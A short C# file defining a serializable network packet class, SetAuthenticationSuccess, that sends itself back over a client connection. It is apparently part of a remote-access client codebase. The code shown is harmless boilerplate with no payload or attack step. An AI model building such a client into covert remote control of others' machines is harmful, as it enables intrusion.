using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class SetAuthenticationSuccess : IPacket
    {
        public SetAuthenticationSuccess()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
